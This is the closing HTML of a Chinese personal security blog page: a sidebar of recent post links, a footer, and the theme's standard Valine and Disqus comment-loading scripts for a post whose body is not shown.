href="/2022/04/25/AFL-Fuzz-training%E7%AC%94%E8%AE%B0/" title="AFL-Fuzz training笔记">AFL-Fuzz training笔记</a><time datetime="2022-04-25T06:05:30.000Z" title="发表于 2022-04-25 14:05:30">2022-04-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/04/19/PIE%E4%B8%8EASLR%E6%B7%B1%E5%BA%A6%E6%80%9D%E8%80%83/" title="对linux下的ASLR保护的思考"><img src="https://my-tc-1308282641.cos.ap-guangzhou.myqcloud.com/markdown/wallhaven-72kyke.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="对linux下的ASLR保护的思考"/></a><div class="content"><a class="title" href="/2022/04/19/PIE%E4%B8%8EASLR%E6%B7%B1%E5%BA%A6%E6%80%9D%E8%80%83/" title="对linux下的ASLR保护的思考">对linux下的ASLR保护的思考</a><time datetime="2022-04-19T12:18:15.000Z" title="发表于 2022-04-19 20:18:15">2022-04-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/04/14/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%96%87%E6%9C%AC%E5%9B%BE%E5%83%8F%E5%8C%96%E4%B8%8E%E6%95%B0%E6%8D%AE%E9%A2%84%E5%A4%84%E7%90%86/" title="深度学习之文本图像化与数据预处理"><img src="https://my-tc-1308282641.cos.ap-guangzhou.myqcloud.com/markdown/typora-user-images/wallhaven-wqvw2x.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="深度学习之文本图像化与数据预处理"/></a><div class="content"><a class="title" href="/2022/04/14/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%96%87%E6%9C%AC%E5%9B%BE%E5%83%8F%E5%8C%96%E4%B8%8E%E6%95%B0%E6%8D%AE%E9%A2%84%E5%A4%84%E7%90%86/" title="深度学习之文本图像化与数据预处理">深度学习之文本图像化与数据预处理</a><time datetime="2022-04-14T12:00:01.000Z" title="发表于 2022-04-14 20:00:01">2022-04-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/03/22/git%E4%B8%8A%E4%BC%A0%E9%A1%B9%E7%9B%AE%E9%80%9A%E7%94%A8%E6%96%B9%E6%B3%95/" title="git上传项目通用方法"><img src="https://my-tc-1308282641.cos.ap-guangzhou.myqcloud.com/markdown/typora-user-images/wallhaven-pkxeo9~1.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="git上传项目通用方法"/></a><div class="content"><a class="title" href="/2022/03/22/git%E4%B8%8A%E4%BC%A0%E9%A1%B9%E7%9B%AE%E9%80%9A%E7%94%A8%E6%96%B9%E6%B3%95/" title="git上传项目通用方法">git上传项目通用方法</a><time datetime="2022-03-22T03:20:07.000Z" title="发表于 2022-03-22 11:20:07">2022-03-22</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By pyh</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'gs3x0tWmEaUp6ROxQivXPxe5-gzGzoHsz',
+      appKey: '8L9o8UYajHnPE9l93nFXvr60',
+      placeholder: '请在此留下你的足迹!',
+      avatar: 'monsterid',
+      meta: 'nick,mail,link'.split(','),
+      pageSize: '10',
+      lang: 'en',
+      recordIP: false,
+      serverURLs: '',
+      emojiCDN: '',
+      emojiMaps: "",
+      enableQQ: false,
+      path: window.location.pathname,
+      requiredFields: ["nick,mail"],
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><script>function loadDisqus () {
+  var disqus_config = function () {
+    this.page.url = 'http://example.com/2021/11/05/Windows%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%A6%86%E7%9B%96SEH%E6%BC%8F%E6%B4%9E/'
+    this.page.identifier = '2021/11/05/Windows漏洞学习之覆盖SEH漏洞/'
+    this.page.title = 'Windows漏洞学习之栈溢出覆盖SEH'
+  };
+
+  window.disqusReset = () => {
+    DISQUS.reset({
+      reload: true,
+      config: disqus_config
+    })
+  }
+
+  if (window.DISQUS) disqusReset()
+  else {
+    (function() { 
+      var d = document, s = d.createElement('script');
+      s.src = 'https://shortname-tddqilfyge.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  }
+}
+
+if ('Valine' === 'Disqus' || !true) {
+  if (true) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
+  else loadDisqus()
+} else {
+  function loadOtherComment () {
+    loadDisqus()
+  }
+}
+</script></div><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
